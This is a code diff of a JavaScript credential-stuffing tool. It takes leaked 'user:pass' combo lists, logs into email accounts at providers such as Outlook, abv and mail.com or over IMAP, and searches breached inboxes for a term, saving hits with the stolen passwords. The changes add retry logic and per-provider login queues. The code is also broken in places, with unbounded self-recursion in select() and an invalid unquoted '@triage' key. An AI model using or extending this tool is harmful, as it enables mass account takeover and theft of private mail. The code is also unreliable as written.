@@ -72,23 +72,49 @@ function parseuser(lout) {
     } else return {}
 }
 
-function select(domain, email) {
+function select(domain, email, tries) {
 	return new Promise(resolve=>{
+		
+		select(domain, email, tries?tries+1:1).then(server=>{
+			resolve(server);
+		})
+
 		let server = mail[domain];
 		if (server) {
 			if (server[1] === 143 || server[1] === 993) return resolve(servers.imap(server[0], server[1]));
 			else resolve();
+
 		} else if (servers.abv.DOMAINS.includes(domain)) {
 			return resolve(servers.abv);
+
 		} else if (servers.outlook.DOMAINS.includes(domain)) {
 			return resolve(servers.outlook);
+
 		} else if (servers.mailcom.DOMAINS.includes(domain)) {
 			return resolve(servers.mailcom);
+
 		} else {
-			resolver(domain, email).then(server=>{
-				if (server?.type === "imap") return resolve(servers.imap(server.hostname, server.port));
-				else resolve();
-			})
+
+			(function discover_mailserver() {
+				let cancelled = false;
+
+				let timedout = setTimeout(function(){
+					cancelled = true;
+
+					if (tries < 3) {
+						discover_mailserver();
+					} else {
+						resolve();
+					}
+				}, 30000);
+
+				resolver(domain, email).then(server=>{
+					if (!cancelled) {
+						if (server?.type === "imap") return resolve(servers.imap(server.hostname, server.port));
+						else resolve();
+					}
+				})
+			})()
 		}
 	})
 }
@@ -104,9 +130,18 @@ function base({ pnid, action, term, combo }) {
 		hits: 0
 	}
 
-	const queue = async.queue((task, cb)=>{
-		task(cb);
-	},120);
+	function _q_(size){
+		return async.queue((task, cb)=>{
+			task(cb);
+		},size);
+	}
+	
+	const queue = {
+		@triage: _q_(100),
+		main: _q_(65),
+		outlook: _q_(25),
+		abv: _q_(1)
+	}
 
 	let pending = [...combo];
 
@@ -131,96 +166,104 @@ function base({ pnid, action, term, combo }) {
 			}
 
 			pendindex++;
-			if (pendindex === 10) {
+			if (action === "combo" && pendindex === 5) {
 				pendindex = 0;
-				if (action === "combo") {
-					datasource.combo.update(pnid, pending);
-				} else {
-					datasource.search.update(pnid, hitlist, pending);
-				}
+				datasource.combo.update(pnid, pending);
+			} else if (action === "search" && pendindex === 10) {
+				pendindex = 0;
+				datasource.search.update(pnid, hitlist, pending);
 			}
+
 			pendlock = false;
 		}
 	},1000)
 
 	function factory(domain, user, pass) {
 		return async cb=>{
-			(function execute(tries) {
-				let cancelled = false;
+			select(domain).then(server=>{
+				if (server) {
+					(function execute(tries) {
+						let cancelled = false;
 
-				let timedout = setTimeout(function(){
-					cancelled = true;
+						let timedout = setTimeout(function(){
+							cancelled = true;
 
-					if (tries < 3) {
-						execute(tries+1)
-					} else {
-						cb();
-					}
-				}, 90000);
-				
-				select(domain).then(server=>{
-					if (server) {
-						server.login(user, pass).then(async api => {
-							clearInterval(timedout);
-
-							if (!cancelled) {
-								if (api.success) {
-									stats.valid++
-
-									if (action === "search") {
-										const list = await api.search(term);
-										if (!list.error) {
-											if (list.results.length > 0) {
-												stats.hits++
-												list.user = user;
-												list.pass = pass;
-												list.domain = domain;
-												hitlist.push(list);
-
-												if (comms) comms.hits(list);
-											}
-										} else  {
-											console.log("Search Error:", list.error);
-										}
-									}
-								} else if (api.error){
-									console.log("Login Error:", api.error);
-								}
-								stats.processed++
-								deletes.push(`${user}:${pass}`)
+							if (tries < 3) {
+								execute(tries+1)
+							} else {
 								cb();
 							}
+						}, 60000);
+
+						queue[server.queue].push(cb2=>{
+							server.login(user, pass).then(async api => {
+								clearInterval(timedout);
+
+								if (!cancelled) {
+									if (api.success) {
+										stats.valid++
+
+										if (action === "search") {
+											const list = await api.search(term);
+											if (!list.error) {
+												if (list.results.length > 0) {
+													stats.hits++
+													list.user = user;
+													list.pass = pass;
+													list.domain = domain;
+													hitlist.push(list);
+
+													if (comms) comms.hits(list);
+												}
+											} else  {
+												console.log("Search Error:", list.error);
+											}
+										}
+									} else if (api.error){
+										console.log("Login Error:", api.error);
+									}
+
+									stats.processed++
+									deletes.push(`${user}:${pass}`)
+									cb2();
+								}
+							})
 						})
-					} else {
-						stats.processed++
-						deletes.push(`${user}:${pass}`)
-						cb();
-					}
-				})
-			})(0);
+
+					})(0);
+				} else {
+					stats.processed++
+					deletes.push(`${user}:${pass}`)
+					cb();
+				}
+			})
 		}
 	}
 
 	for (let entry of combo) {
 		let { user, domain, pass } = parseuser(entry);
 		if (user && domain && pass) {
-			queue.push(factory(domain,user,pass));
+			queue["@triage"].push(factory(domain,user,pass));
 		} else {
 			stats.total--;
 		}
 	}
 
-	queue.drain(function() {
-		if (action === "combo") {
-			datasource.combo.delete(pnid);
-		} else {
-			hitlist.sort(function(a,b){
-				return (a.results[0].date < b.results[0].date) ? -1:1
-			})
-			datasource.search.update(pnid, hitlist, []);
-		}
-		running = undefined;
-		if (comms) comms.finish();
+	const NOOP = (N=>{});
+
+	queue["@triage"].drain(function() {
+		Promise.all([ queue.abv.drain(NOOP), queue.main.drain(NOOP), queue.outlook.drain(NOOP) ]).then(function(){
+			if (action === "combo") {
+				datasource.combo.delete(pnid);
+			} else {
+				hitlist.sort(function(a,b){
+					return (a.results[0].date < b.results[0].date) ? -1:1
+				})
+				datasource.search.update(pnid, hitlist, []);
+			}
+			running = undefined;
+			if (comms) comms.finish();
+		})
 	});
 
 	return {
